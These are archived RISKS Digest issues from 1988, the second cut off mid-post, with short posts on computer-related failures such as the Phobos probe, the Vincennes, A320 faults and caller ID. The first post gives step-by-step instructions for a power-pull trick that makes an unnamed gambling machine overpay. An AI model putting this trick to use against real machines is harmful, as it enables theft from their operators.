<DOC>
<DOCNO>WT11-B32-1</DOCNO>
<DOCOLDNO>IA012-000131-B034-53</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.49.html 128.240.150.127 19970217023012 text/html 26129
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:28:39 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 49</TITLE>
<LINK REL="Prev" HREF="/Risks/7.48.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.50.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.48.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.50.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 49</H1>
<H2> Sunday 11 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Firmware bugs in Dutch gambling machines 
</A>
<DD>
<A HREF="#subj1.1">
P. Knoppers
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Soviets See Little Hope of Controlling Spacecraft 
</A>
<DD>
<A HREF="#subj2.1">
Gary Kremen
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Disinterest in disaster not based on probability estimates 
</A>
<DD>
<A HREF="#subj3.1">
Clifford Johnson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  What a Ticonderoga Combat System "records" 
</A>
<DD>
<A HREF="#subj4.1">
John Allred
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  High-tech toilets 
</A>
<DD>
<A HREF="#subj5.1">
Robert Dorsett
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  ANI/911 Misconceptions 
</A>
<DD>
<A HREF="#subj6.1">
Dave Robbins
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Display of telephone numbers on receiving party's phone 
</A>
<DD>
<A HREF="#subj7.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Social content of computer games 
</A>
<DD>
<A HREF="#subj8.1">
Eric Postpischil
</A><br>
<A HREF="#subj8.2">
 Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  "Viruses Don't Exist" and the Marconi Mysteries... 
</A>
<DD>
<A HREF="#subj9.1">
Mark Moore
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Firmware bugs in Dutch gambling machines
</A>
</H3>
<address>
P. Knoppers
&lt;<A HREF="mailto:knop%dutesta%mcvax@uunet.UU.NET ">
knop%dutesta%mcvax@uunet.UU.NET 
</A>&gt;
</address>
<i>
Sat, 10 Sep 88 17:21:03 -0200
</i><PRE>

In the Netherlands it is legal to exploit gambling machines if these
are approved by a government-operated test institution.

There is currently an approved machine in use that has a rather severe
problem in its firmware. This fault can be exploited by malicious players.
I will not reveal which machine type has the bug, there may even be
several models that have it.

The trick is as follows:
Use the machine until you have won a substantial price (call this price 1).
Pull the power plug BEFORE the machine has started to pay out.
Re-insert the power plug.
  The machine will self-test and pay out the pending price 1.
On the next price that you win (no matter how small) the machine
pays the amount of price 1.

The use of this trick can empty the coin buffer of the machine within
one hour.

It appears that a system that was designed to protect the players from
financial losses in case of a power failure introduced a risk.
Makes me  wonder what measures are built in ATMs to protect customers
in case of a power failure during a transaction...

P. Knoppers - knop@dutesta.UUCP
Delft Univ. of Technology, Faculty of Electrical Engineering, The Netherlands.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Soviets See Little Hope of Controlling Spacecraft
</A>
</H3>
<address>
Gary Kremen (The Arb) 
&lt;<A HREF="mailto:89.KREMEN@GSB-HOW.Stanford.EDU">
89.KREMEN@GSB-HOW.Stanford.EDU
</A>&gt;
</address>
<i>
Sat 10 Sep 88 15:22:49-PDT
</i><PRE>

According to today's (Saturday, September 10, 1988) New York Times, the
Soviets lost their Phobos I spacecraft after it tumbled in orbit and the
solar cells lost power. The tumbling was caused when a ground controller
gave it an improper command.

This has to one of the most expensive system mistakes ever.

Gary Kremen, Stanford Graduate School of Business

  [Several people reported on radio items that attributed the problem to a
  console operator's single keystroke in error, which it was speculated might
  have triggered the Mars probe's self-destruct signal.  After the command was
  sent, contact with the probe was lost completely.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Disinterest in disaster is not based on probability estimates.
</A>
</H3>
<address>
"Clifford Johnson" 
&lt;<A HREF="mailto:GA.CJJ@Forsythe.Stanford.EDU">
GA.CJJ@Forsythe.Stanford.EDU
</A>&gt;
</address>
<i>
Sat, 10 Sep 88 18:18:00 PDT
</i><PRE>

A recent contributor noted disinterest is a planned conference
on disasters in Chicago.  Another noted:

 &gt; John Cullyer of the British Royal Signals and Radar Establishment ...  said,
 &gt; "Let's throw out the 10 ** -9" - and many of the audience responded with
 &gt; enthusiastic applause. Someone asked if he would accept a failure
 &gt; probability of only 10 ** -4 or 10 ** -5 for nuclear weapons safety.  He
 &gt; responded, "In the weapons area there should be no room for probability. If
 &gt; something is unthinkable, don't let it happen.  You either certify it or you
 &gt; don't - one or zero."

Three months ago I was set for a 2-hour interview/call-in program on the San
Francisco CBS radio station.  My topic was the probability of computer-related
error causing accidental nuclear Armageddon, which even conservative
authorities (e.g. Hudson Institute) estimate to have a probability of the order
of 10**-3 per year.  I reckon it's higher, and can argue the point.

On arrival, I found my time reduced to one and a half hours because of a change
in the computerized California lottery which provided for a bigger
multi-million $ jackpot at even longer odds.  This topic was inserted as a
first interview/call-in feature, for half an hour before me.  The odds of
winning the jackpot per ticket must be of the order of 10**-8.  Even buying a
hundred tickets per year doesn't get the odds above 10**-6 per year.

Maybe you can guess the rest.  The station had a screen displaying the status
of the five incoming phone lines.  They were packed for the lottery call-in.
For example, animated callers complained that South California got more prizes
than the North, and the lottery official patiently responded that the prizes
were in fair proportion to money spent. Etc.  Clearly, the lowering of the odds
of success (which the official never quantified) was of scant concern to
callers agog at visions of the higher jackpot.  The lottery debate was extended
for a further half hour.  I didn't mind: one hour is more than enough for my
message.

In the first 25 minutes of my call-in interview, there was not a single caller.
There were only three in the entire hour.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 What a Ticonderoga Combat System "records"
</A>
</H3>
<address>
John Allred 
&lt;<A HREF="mailto:jallred@VAX.BBN.COM">
jallred@VAX.BBN.COM
</A>&gt;
</address>
<i>
Fri, 9 Sep 88 17:36:05 EDT
</i><PRE>

  Jonathan Jacky, University of Washington, asks:
  &gt;The effect of these misconceptions is to discourage thorough investigations
  &gt;of possible problems.  I now doubt the frequently heard assertion that
  &gt;the Vincennes actually did correctly identify the altitude and heading of
  &gt;the Airbus...

First off, my credentials on this subject:  I worked on the Combat System of a
Spruance Class Destroyer, a direct predecessor of the Vincennes (and other
Ticonderoga Class Cruisers).  Indeed, a "Tico" has the same hull as a Spruance.
Add that nifty phased array radar (SPY-1), lots of missiles, and an enhanced
Combat System (5 tactical data computer (AN-UYK7), versus 2 on a Spruance), and
you get a Tico.  The Combat System on the Tico is also known as AEGIS.

The Combat System records, in real time and on magnetic tape, the symbology
seen by the radar operators anytime the "program" is up.  During training, it
was common to "play back" a canned scenario to exercise the troops and
equipment.  So, when the Investigation Officer's report says, "AEGIS reported
Iran Air 655 as ascending", the Investigation Team probably replayed the tapes
of the incident, and saw a display reporting Iran Air 655's status *AS THE CREW
SAW IT*.

John Allred, BBN Systems and Technologies, Inc.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
High-tech toilets
</A>
</H3>
<address>
Robert Dorsett
&lt;<A HREF="mailto:juniper!mentat@emx.utexas.edu ">
juniper!mentat@emx.utexas.edu 
</A>&gt;
</address>
<i>
Sat, 10 Sep 88 19:17:27 edt
</i><PRE>

Pages 132-136 of the 9/3/88 issue of Flight International has a summary of the 
first six months of A320 service with British Airways (3 airplanes) and Air 
France (2 airplanes).  Mulhouse-Habsheim crash not withstanding, both airlines
claim a dispatch rate of approximately 97%.  Some highlights from the 
article:

1.  Problems with air conditioning packs, which have resulted in BA restricting
fan output to 80% of suggested maximum.  This is listed as a supplier problem.

2.  The FADEC (full-authority digital engine control, a fancy term for a 
computer-controlled fuel metering system) has been reliable, although Air 
France claimed frequent replacements in the first few weeks of service.

3.  The computer-controlled cabin public address and lighting system does not
work very well.  Both airlines are disgusted at the sloppyness of it.  Again,
it is listed as a supplier problem.

4.  The toilets don't work very well (see excerpt below).

5.  There was mention of in-flight failures of the primary guidance system,
but the backup systems worked as advertised.

6.  There have been software modifications of the "flight management and 
guidance computer, fuel quantity indications computer, cargo compartment
ventilation computer, avionics equipment ventilation computer, window heat
computer, and bleed monitoring computer."  (One wonders when they will replace
a simple on/off switch with a computer).  The modifications were required
when some computers shut down after the power sources for the mains was 
switched from the APU to the engine generators.

7.  95% of all system faults have occurred after engine startup, before the
airplane got in the air.  En route failures are rare.

On the plus side, BA claims that the centralized fault display system, which is
a CRT and possibly a printer, intended for use by maintenance personnel, has
been quite successful in detecting faulty items and systems, improving
maintenance time considerably.  They have encountered the occasional
unintelligible message, though.  They look forward to incorporating the system
with a communications package to let it automatically call maintenance bases to
let maintenance personnel "get ready" for a quick repair job on the airplane
when it arrives.  The CFDS is based on the late 70's AIDS (Airborne Indicated
Data System), tested with mixed results on the 747, and later on the 757/767.
The device keeps track of data which is not normally of operational
significance.  The data can then be offloaded, catalogued, analyzed, etc.
Apparently Airbus has incorporated an expert system to form the latest version.


It should be observed that something Steve Philipson said, about the Airbus
being very much an "experimental aircraft," holds weight, even though the
concentration of problems has shifted.  Airbus is said to be keeping a full
staff of engineers on site at Air France and British Airways maintenance 
bases.  In addition, each airplane is carrying a set of computer "spares"
(spares for what, the article doesn't mention) in the event of failure.
The article does not indicate how long this arrangement is going to last. 


Now, about the toilets... (excerpted without permission, but let's say it's
for the purposes of review)

"The main concern about the A320 has been that so many functions are 
'computer-controlled,' and that this could lead to unforeseen problems.  The
use of the word 'computer' can be misleading, in fact, because many of the
devices referred to as computers are little more than digitally controlled
switches--like the window heat computer, whose software has now been
spike-vaccinated.

"The whole subject comes firmly down to earth in the Air France A320's, where
the high-tech vacuum toilet system chosen by that airline (but not by BA) has
suffered shutdown because of glitches caused by electrical transients.
Aircraft have been grounded by this problem from time to time.  You can get an
aircraft airborne safely without working toilets, but it is unwise to try to
get any passengers airborne under those conditions.

"Air France chose the vacuum toilet system for its single-point drainage and
the flexibility to move a toilet quickly for a short-notice cabin
reconfiguration.  However, its A320's have been subject to four different types
of toilet system malvunction: toilet overflow, toilet shutdown, system
shutodwn, and straightforward toilet drain blockage.  The latter may be a
matter of wastepipe diameter, though not everyone agrees on that.  It has
worked on other aircraft.

"Airbus, in its produce support department's technical review of Air
France's A320 toilets problem, devotes a page to the subject, with a chart
designating specific problems followed by progress towards rectification.
The toilet overflow was caused by a rinse-valve which was sticking open.
The temporary remedy is a valve modification, but a redesigned valve is on
the way.  The individual toilet shutdown and the whole-system shutdown have
been caused by electrical transients which affected the digital flush
control units (FCU--the minicomputer activated by the button which the user
pushes to flush the toilet) and the vacuum system controller (VSC--another
microprocessor).  The printed circuit boards for the FCU and VSC were under
study for modification, and new software should have been supplied for them
both by now.  As for the drain blockage, Airbus and the system vendors were
examining the suction unit in thorough system tests, and hoped to have a
result by the end of August."


It should be added that the A320's fuel efficiency is listed at 40% better
than that of the 727.  Overall efficiency has yet to be determined.  The order 
book stands at either 428 aircraft ("Flight") or 350 aircraft ("Aviation 
Week").  The word "computer" and the term "high-tech" is very clearly selling 
the airplane.  Flight lists eleven A320's currently in service.

Robert Dorsett                                    University of Texas at Austin
Organization: Austin UNIX Users' Group, Austin, TX

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
ANI/911 Misconceptions
</A>
</H3>
<address>
Dave Robbins 
&lt;<A HREF="mailto:dcr0%uranus@gte.com">
dcr0%uranus@gte.com
</A>&gt;
</address>
<i>
Fri, 9 Sep 88 11:00:46 EDT
</i><PRE>

It may be worthwhile to clear up some small misconceptions that have been
appearing in the Automatic Number ID discussion.  More than one correspondent
has equated the 911 automatic identification with the calling-number
identification just now becoming available to local subscribers.  In fact, the
two are entirely different features -- implemented differently and having
nothing little more than their general behavior in common.  In particular:

1) "Enhanced 911" (as it is properly called -- regular 911 is nothing
   more than an easy-to-remember and quick-to-dial number; it does not
   identify the caller) is implemented by essentially the same
   mechanism as ANI for toll calls.  In both cases, the calling number
   is sent out over a trunk line, not over a local subscriber loop.  As
   far as I know, this type of calling number identification has never
   been made available to businesses, as one correspondent suggested it might.

2) Calling-number-identification (there is a marketing name for this, but
   I forget it offhand) is a feature available only from the newest
   ESS and competing switches, and requires special equipment on the
   subscriber's premises as well as special hardware and software on the
   switch (and of course more money from the subscriber :-).  As far as I
   know, each subscriber has the option of specifying -- permanently --
   whether or not his number will be disclosed to others via this feature;
   the default value for this option would reflect the subscriber's current
   selection of a published or non-published number.  In addition, as
   mentioned by some correspondents, on a given call a subscriber may
   choose -- via a dialed prefix -- whether or not to allow the display
   of his number on the called phone.

Caveat: although I do work for a "phone company" my knowledge of the
above is not necessarily 100% accurate or up-to-date, since I have not
been directly involved with the gory details of these particular
technologies.

RISKS relevance?  My concern is twofold:

1) Confusion between two apparently similar but in fact considerably
   different systems can result in the risks of the one being *assumed*
   to be identical to the risks of the other, when in fact this is not
   the case.  In the example at hand, there is no assumption of a right
   of privacy when calling 911, but there is an assumption of such a right
   when calling everyone else.  These assumptions are made by the respective
   systems, reflecting what is presumed to be the same assumptions made
   by the general public.  Viewing one system as though it were the other
   changes the perceived risks.

2) Much of the discussion in RISKS on this topic (and others, of course)
   is based upon incomplete information and therefore incorrect
   assumptions about the technology involved.  This is, I realize, a
   general problem, and perhaps unavoidable.  However, when discussing
   the risks of technology, computer or otherwise, we need to take
   particular care to base the discussion upon the facts, so that we can
   discuss the risks of the system as it actually is implemented.  

Dave Robbins, GTE Laboratories Incorporated, 40 Sylvan Rd., Waltham, MA 02254

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Display of telephone numbers on receiving party's phone
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sat, 10 Sep 88 00:25:03 EDT
</i><PRE>

People are missing an important issue here:  there is no one-to-one
correlation between the number you are calling from and your identity.
In particular, it is quite possible to have situations in which a call
is not anonymous -- in the sense that the caller has no intent to hide
his identity -- but does not want his location known.  This is also the
underlying problem behind having phone solicitors calling from uncallable
numbers:  what you want is identity and contact information, not just the
number used to make the call.
                                     Henry Spencer at U of Toronto Zoology

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Social content of computer games
</A>
</H3>
<address>
&lt;<A HREF="mailto:postpischil%being.DEC@decwrl.dec.com">
postpischil%being.DEC@decwrl.dec.com
</A>&gt;
</address>
<i>
Thu, 8 Sep 88 08:38:56 PDT
</i><PRE>

Ed Nilges writes of the decline of the social and moral content of games.  But
he examines only a small number of games.  Consider chess, that game which
allows players to act the roles of strategists without teaching them either the
misery of dying under a horse's hooves or the evils of a caste system.  The
tactics are beautiful; the content is vile.  Clearly it is not technology
encouraging any moral or social decline here.  Perhaps parents should picket
chess clubs.

Nilges' examples are not representative of the games.  The top character of
Punch-Out is black.  Metroid features a character in a suit of high-tech armor.
If the player has done well enough at the end of the game, the character will
take her helmet off.  Many games take the form of a quest to defeat evil --
Ghosts 'N Goblins, Legend of Zelda, Solomon's Key, Super Mario Brothers.
Popeye is supportive of the underdog.  Games like Gauntlet or Mario Brothers
reward teamwork.  Penguin Land requires that one learn to take care with a
fragile egg.  There is a wide variety to be found in games, so one could find
examples of many things by concentrating on only certain features. 

Computers have made games flashier, more fun, faster, and more visible, but
they have not changed the social content.
                   				Eric Postpischil

</PRE>
<HR><H3><A NAME="subj8.2">
Social content of video games
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sat, 10 Sep 88 00:25:26 EDT
</i><PRE>

&gt;How many computer professionals have noticed the continual technical
&gt;improvement of video games in the past couple of years, and the
&gt;concomitant decline of their social and moral content? ...

As has been pointed out in the past, this is silly.  The social and moral
content of chess or Monopoly is also deplorable, looked at from the same
viewpoint.  (Chess is a wargame; the objective of Monopoly is to drive
your friends and relatives into bankruptcy.)  Video games only make it a
bit more obvious.  Wargames, in particular, long predate video games.
Is it less moral to strafe the bad guys in a video game than to condemn
thousands of hypothetical troops to death by moving a counter on a board?
Which is more depersonalizing?
                                     Henry Spencer at U of Toronto Zoology

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 "Viruses Don't Exist" and the Marconi Mysteries...
</A>
</H3>
<address>
Mark Moore 
&lt;<A HREF="mailto:MARKO@s55.prime.com">
MARKO@s55.prime.com
</A>&gt;
</address>
<i>
Wed, 07 Sep 88 17:30:40 EDT
</i><PRE>

I received one of those info-card packs (I forget from whom) as a result
of having my name and address sold by Dr. Dobb's.  I filled out a few of the
cards and received a catalog from Public Brand Software, which is a shareware/
freeware clearing house based in Indianapolis, IN.

Here are a few quotes on from the third page of their catalog entitled
'Topic: VIRUSES'

  'It seems like a couple of national magazines first thought up the concept
  of MS-DOS viruses.  Unfortunately, a lot of people read these magazines and
  believe everything that they read.  But let's get a couple of definitions
  clear first.

    virus, n. 1. a purposely destructive computer program that can
      propagate itself by modifying other computer programs (such
      as COMMAND.COM) to make them destructive.  2. a destructive
      myth perpetrated to sell a product and/or fill editorial
      space.'

The article goes on to claim that viruses are myths akin to friend-of-a-friend
stories; popular magazines are perpetuating the myths to have something
sensational to print; engineers are doing the same in order to sell vaccines.
They claim that they've searched high and low and can find no such thing as a
virus.  'Simply put, there is no such thing as a virus.  There never has been.
Period.'

Sounds like a dangerous attitude to me.

On a different note...  For those interested in a book which follows a plot
with a striking similarity to the Marconi incidents, try _The Chain of Chance_
by Stanislaw Lem.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.48.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.50.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-2</DOCNO>
<DOCOLDNO>IA012-000131-B034-72</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.50.html 128.240.150.127 19970217023027 text/html 23073
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:28:53 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 50</TITLE>
<LINK REL="Prev" HREF="/Risks/7.49.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.51.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.49.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.51.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 50</H1>
<H2> Monday 12 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computer glitch costs AA $50M ..." 
</A>
<DD>
<A HREF="#subj1.1">
Ken Calvert
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Risks of Motel Computers 
</A>
<DD>
<A HREF="#subj2.1">
Brint Cooper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  IFF and the Vincennes 
</A>
<DD>
<A HREF="#subj3.1">
Geoff. Lane.
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "Single keystroke" 
</A>
<DD>
<A HREF="#subj4.1">
Philip E. Agre
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  `Credit doctors' 
</A>
<DD>
<A HREF="#subj5.1">
Donn Seeley
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Scientific Safety 
</A>
<DD>
<A HREF="#subj6.1">
WHMurray
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Bev Littlewood's message in <A HREF="/Risks/7.48.html">RISKS-7.48</A> 
</A>
<DD>
<A HREF="#subj7.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Calculations with Wrapped Numbers     
</A>
<DD>
<A HREF="#subj8.1">
Mark Brader
</A><br>
<A HREF="#subj8.2">
 Bennet Yee
</A><br>
<A HREF="#subj8.3">
 Jan Wolitzky
</A><br>
<A HREF="#subj8.4">
 Roger Goun
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
"Computer glitch costs AA $50M ..."
</A>
</H3>
<address>
&lt;<A HREF="mailto:calvert@cs.utexas.edu">
calvert@cs.utexas.edu
</A>&gt;
</address>
<i>
Mon, 12 Sep 88 10:36:29 CDT
</i><PRE>

  &gt;From the Austin American-Statesman, Sun., 11 Sept. without permission:

  Computer glitch costs American $50 million in lost ticket sales
  by Martin Zimmerman, Dallas Morning News

  FORT WORTH- American Airlines, Inc. lost as much as $50 million in potential
  revenue this year when its computerized reservations system mistakenly
  restricted the sale of discount tickets, driving price-conscious travelers to
  American's competitors, the airline's chairman told industry analysts this
  week.  
    According to analysts who attended the metting in New York with Robert
  Crandell, American's chairman, president and CEO, the revenue loss was due
  to a foul-up in the airline's yield-management system.  "(Crandell) said
  that early in the second quarter they had implemented a new software program,
  which appears to have backfired," said one investment company analyst, who
  asked not to be named. "It did not do what it was intended to do."
    Yield management involves the use of sophisticated computer programs to
  determine how many seats on an airplane should be sold at various prices,
  squeezing the greatest possible revenue out of each ticket sold.
  On flights where there is heavy demand for seats, for instance, the program
  will instruct that fewer tickts should be sold at discount prices. On
  less-popular flights, more tickets will be sold at discount fares to fill
  what otherwise would be empty seats.
    American is considered an industry leader in yield management. But when the
  airline modified its system this year, the new program contained a serious
  flaw.
    According to the analysts, Crandall said the modified program prematurely
  stopped the sale of discount tickets for American flights, even though more
  seats would normally have been offered at lower fares.  Travelers searching
  for a cheap fare -- told that none were available on American -- presumably
  then went to another airline to buy a ticket.
    Lowell Duncan, American's vice president-corporate communications, said the
  problem went on for 30 to 60 days before it was discovered and corrected.  It
  came to light when wide discrepancies cropped up in the number of discount
  tickets sold during the second quarter of 1988 compared to previous
  quarters....
    News of the foul-up apparently didn't cause much of a stir among the
  analysts, who study airlines' financial performance and then make
  recommendations on whether investors should buy their stock....  "Had
  American had a poor quarter, this glitch might have been more of a problem,"
  said Timothy Pettee, an airline analyst...  As it was, American's yields --
  the amount of money collected per passenger -- increased 13 percent in the
  second quarter, Pettee said.  "They might've been up 15 to 17 percent without
  this glitch, which would've been phenomenal," he said.

This seems relevant to the recent discussions on quantitative risk assessment.

The $50 million figure must be regarded with suspicion in the absence of
further information.  (Does anybody besides me have a problem with phrases like
"losses" in "potential" revenue?)  Such numbers are meaningful only in context,yet it seems to be unavoidable in our society that, once created, they take on
a life of their own and appear in isolation.  In my experience the problem is
not limited to the media.  (Hence I am generally skeptical about quantitative
methods in system design and certification.)

Ken Calvert

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Risks of Motel Computers
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.MIL">
abc@BRL.MIL
</A>&gt;
</address>
<i>
Mon, 12 Sep 88 9:46:21 EDT
</i><PRE>

	The following illustrates just how ignorant the "general public"
remains of issues that the Risks community almost take for granted.

	Last month, with a friend my wife and I were touring Southern Maryland.
We stopped unannounced at a new Holiday Inn and booked two rooms in my name.
With both rooms' keys in hand, we proceeded to our friend's room; I opened the
door to check out her room and found that the room was not vacant.  While no
one was actually in the room, briefcases, books, and clothes made it evident
that someone else was already booked therein.

	Angrily, I returned to the desk, explaining to the very young night
staff there the real risk of such an error:  that the room might be occupied by
a handgun-toting paranoid who would shoot first and ask questions later.  The
young woman offered that "the computer must have made a mistake."  I slightly
mis-represented myself as a "computer scientist" and told her that this was no
excuse and repeated all the arguments that are more than familiar to readers of
"Risks Digest."  We were assigned another room.

	At checkout the next morning, I reported the mistake to the morning
staff, so that "management" would become aware.  After the expected profuse
apologies, the desk manager said, "The computer shouldn't have allowed that.
The night clerk must have made a mistake."

	What could I say?
                                                  Brint Cooper

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
   IFF and the Vincennes
</A>
</H3>
<address>
"Geoff. Lane. Tel UK-061 275 6051" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Mon, 12 Sep 88 09:32:13 BST
</i><PRE>

  Once upon a  time I worked on  the IFF software of  the Nimrod project.
  (Nimrod was a British Airborne Early Warning system which got cancelled
  - to be replaced by AWACS). As part of the design process we were given
  a few lectures on the purposes and uses of IFF in general. During these
  we found out that

     a) NO  combat fighter plane  will ever go  into combat with  its IFF
     system operating - for obvious reasons!

     b) If you are  in a combat zone and a planes' IFF  claims it to be a
     civilian assume that it is a counterfeit signal.

  These policies were not, to my  knowledge built into the software. They
  were left for the pilot to act upon. This was about 10 years ago now. I
